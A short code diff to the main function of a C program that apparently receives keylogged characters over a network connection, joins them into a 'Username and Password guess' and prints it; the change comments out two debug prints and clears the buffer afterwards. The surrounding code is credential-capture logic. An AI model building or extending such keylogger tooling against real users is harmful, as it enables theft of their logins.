@@ -209,9 +209,9 @@ int main(int Count, char *Strings[])
 
     printf("Printing out keylogged info...\n");
     while (!isEmpty(characters)) {
-        printf("Inside: ");
+        //printf("Inside: ");
         node = Dequeue(characters);
-        printf("%s\n", node->data.info);
+        //printf("%s\n", node->data.info);
         strcat(guess, node->data.info);
         free(node->data.info);
         free(node);
@@ -219,6 +219,7 @@ int main(int Count, char *Strings[])
     trim(guess);
 
     printf("Username and Password guess: %s\n", guess);
+    memset(guess,0,strlen(guess));
 
     /*---Close data connection---*/
     close(clientfd);
